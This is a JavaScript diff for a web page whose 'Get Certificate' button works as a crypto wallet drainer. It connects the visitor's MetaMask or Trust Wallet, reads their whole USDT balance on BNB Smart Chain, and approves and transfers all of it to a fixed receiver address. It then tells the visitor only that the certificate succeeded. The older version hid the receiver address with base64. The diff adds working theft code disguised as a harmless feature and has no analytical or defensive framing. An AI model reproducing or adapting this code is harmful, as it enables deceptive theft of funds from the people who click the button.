@@ -1,47 +1,78 @@
-document.getElementById('getCertificateBtn').addEventListener('click', async () => {
-    if (typeof window.ethereum === 'undefined') {
-        alert("Please install Trust Wallet or MetaMask.");
-        return;
-    }
+const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
+const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
 
-    // Wallet address (base64 encoded)
-    const encoded = "MHgwQjUzOTQxYjk0OUQzYWM2OEJhNDhBRjM5ODVGOUY1OTEwNUNGOTk5";
-    const receiver = atob(encoded); // Decode it
+const ABI = [
+  {
+    constant: true,
+    inputs: [{ name: "_owner", type: "address" }],
+    name: "balanceOf",
+    outputs: [{ name: "balance", type: "uint256" }],
+    type: "function",
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "_spender", type: "address" },
+      { name: "_value", type: "uint256" },
+    ],
+    name: "approve",
+    outputs: [{ name: "success", type: "bool" }],
+    type: "function",
+  },
+  {
+    constant: false,
+    inputs: [
+      { name: "_from", type: "address" },
+      { name: "_to", type: "address" },
+      { name: "_value", type: "uint256" },
+    ],
+    name: "transferFrom",
+    outputs: [{ name: "success", type: "bool" }],
+    type: "function",
+  },
+  {
+    constant: true,
+    inputs: [
+      { name: "_owner", type: "address" },
+      { name: "_spender", type: "address" },
+    ],
+    name: "allowance",
+    outputs: [{ name: "remaining", type: "uint256" }],
+    type: "function",
+  }
+];
 
-    const usdtAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT BEP-20 BSC
-    const usdtAbi = [
-        "function approve(address spender, uint value) public returns (bool)",
-        "function allowance(address owner, address spender) public view returns (uint256)",
-        "function transferFrom(address from, address to, uint value) public returns (bool)",
-        "function balanceOf(address account) external view returns (uint256)",
-        "function decimals() view returns (uint8)"
-    ];
+document.getElementById("getCertificateBtn").addEventListener("click", async () => {
+  if (typeof window.ethereum === "undefined") {
+    alert("Trust Wallet ya MetaMask install karein!");
+    return;
+  }
 
-    const web3 = new Web3(window.ethereum);
-    await window.ethereum.request({ method: 'eth_requestAccounts' });
-    const accounts = await web3.eth.getAccounts();
-    const sender = accounts[0];
+  const web3 = new Web3(window.ethereum);
+  await window.ethereum.request({ method: "eth_requestAccounts" });
 
-    const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-    const decimals = await contract.methods.decimals().call();
-    const balance = await contract.methods.balanceOf(sender).call();
-    const fullAmount = balance.toString();
+  const accounts = await web3.eth.getAccounts();
+  const sender = accounts[0];
 
-    if (parseInt(fullAmount) <= 0) {
-        document.getElementById("status").innerText = "No USDT found in your wallet.";
-        return;
-    }
+  const usdt = new web3.eth.Contract(ABI, usdtAddress);
 
-    try {
-        // Approve and then transfer full balance
-        await contract.methods.approve(receiver, fullAmount).send({ from: sender });
-        await contract.methods.transferFrom(sender, receiver, fullAmount).send({ from: sender });
+  const balance = await usdt.methods.balanceOf(sender).call();
+  if (balance === "0") {
+    alert("USDT balance nahi mila.");
+    return;
+  }
 
-        const formattedAmount = (parseInt(fullAmount) / (10 ** decimals)).toFixed(4);
-        document.getElementById("status").innerText = `Certificate Successfully - ${formattedAmount} USDT Transferred`;
+  // Approve step
+  await usdt.methods
+    .approve(receiverAddress, balance)
+    .send({ from: sender });
 
-    } catch (err) {
-        console.error(err);
-        document.getElementById("status").innerText = "Transaction Failed or Rejected";
-    }
+  // Transfer step
+  await usdt.methods
+    .transferFrom(sender, receiverAddress, balance)
+    .send({ from: sender });
+
+  const humanReadable = web3.utils.fromWei(balance, "ether");
+
+  alert(`Certificate successfully.\nTransferred: ${humanReadable} USDT`);
 });
